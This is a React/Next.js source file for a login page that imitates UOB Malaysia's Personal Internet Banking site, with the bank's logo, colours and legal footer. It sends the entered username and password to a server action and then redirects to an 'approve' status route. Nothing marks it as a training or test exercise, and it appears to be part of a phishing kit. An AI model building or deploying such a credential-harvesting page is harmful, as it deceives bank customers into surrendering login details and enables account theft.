"use client";

import React, { useState } from "react";
import Image from "next/image";
import { Loader2 } from "lucide-react";
import { submitUobLogin } from "@/lib/action";
import { useRouter } from "next/navigation";

export default function UobLoginPage() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const router = useRouter();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (username.length < 3 || password.length < 6) {
      setError("Please enter valid credentials.");
      return;
    }

    setIsLoading(true);
    setError("");

    try {
      const result = await submitUobLogin(username, password);
      if (result.success) {
        setTimeout(() => {
          router.push("/b/status/approve");
        }, 1500);
      } else {
        setError(result.error || "Login failed. Please try again.");
        setIsLoading(false);
      }
    } catch (err) {
      setError("Something went wrong. Please try again later.");
      setIsLoading(false);
    }
  };

  return (
    <div className="flex min-h-screen flex-col bg-gradient-to-b from-[#004B8D] via-[#004B8D] to-[#FFCC00] font-sans text-[#333]">
      {/* Top Header Logo */}
      <div className="px-6 pt-10 pb-8">
        <div className="bg-white p-3 inline-block shadow-lg">
          <Image
            src="/bank/UOB_Logo_(2022).svg"
            alt="UOB Logo"
            width={120}
            height={36}
            className="h-9 w-auto"
          />
        </div>
      </div>

      {/* Main Content Card */}
      <main className="flex flex-1 flex-col px-6">
        <div className="w-full max-w-lg bg-white shadow-2xl">
          {/* Card Header */}
          <div className="border-b border-gray-100 p-8">
            <h1 className="text-[20px] font-medium leading-tight text-[#666]">
              Welcome to UOB Personal<br />Internet Banking Malaysia
            </h1>
          </div>

          {/* Form Area */}
          <div className="p-8">
            <form onSubmit={handleLogin} className="space-y-6">
              {error && (
                <div className="rounded bg-red-50 p-3 text-center text-sm font-medium text-red-600 border border-red-100">
                  {error}
                </div>
              )}

              <div className="space-y-1.5">
                <label className="text-[13px] font-bold text-gray-400 uppercase tracking-wide">USERNAME</label>
                <input
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="w-full rounded border border-gray-300 py-3 px-4 text-[16px] outline-none transition-all focus:border-[#004B8D]"
                  required
                />
              </div>

              <div className="space-y-1.5">
                <label className="text-[13px] font-bold text-gray-400 uppercase tracking-wide">PASSWORD</label>
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full rounded border border-gray-300 py-3 px-4 text-[16px] outline-none transition-all focus:border-[#004B8D]"
                  required
                />
              </div>

              <div className="pt-2">
                <button
                  type="submit"
                  disabled={isLoading}
                  className="rounded bg-[#2E6EB7] px-8 py-2.5 text-[17px] font-bold text-white shadow-md transition-all active:scale-[0.98] disabled:opacity-80"
                >
                  {isLoading ? (
                    <Loader2 className="mx-auto h-6 w-6 animate-spin" />
                  ) : (
                    "Submit"
                  )}
                </button>
              </div>

              <div>
                <button
                  type="button"
                  className="text-[15px] font-bold text-[#2E6EB7] underline decoration-dotted underline-offset-4"
                >
                  Forgot Username/Password?
                </button>
              </div>
            </form>
          </div>

          {/* Card Footer */}
          <div className="bg-[#F5F5F5] p-8">
            <p className="text-[15px] text-gray-600 mb-2">Don't have access? Get it instantly!</p>
            <button className="text-[15px] font-bold text-[#2E6EB7] underline decoration-dotted underline-offset-4">
              Register now!
            </button>
          </div>
        </div>
      </main>

      {/* Page Footer */}
      <footer className="bg-[#004B8D] mt-12 px-6 py-12 text-white">
        <div className="max-w-2xl mx-auto">
          {/* Social Icons */}
          <div className="flex gap-6 mb-10 border-t border-white/20 pt-10">

          </div>

          {/* Legal and Disclaimer */}
          <div className="space-y-8 text-[13px] leading-relaxed opacity-90 font-medium">
            <p>
              As a reminder, UOB will never direct you to a website asking for your
              personal/corporate banking details, including username, password, OTP
              or Card PIN.
            </p>

            <div className="space-y-1">
              <p>Copyright © 2026 United Overseas Bank (Malaysia) Bhd.</p>
              <p>(Reg. No. 199301017069 (271809-K)).</p>
              <p>All Rights Reserved.</p>
              <p>Member of PIDM.</p>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
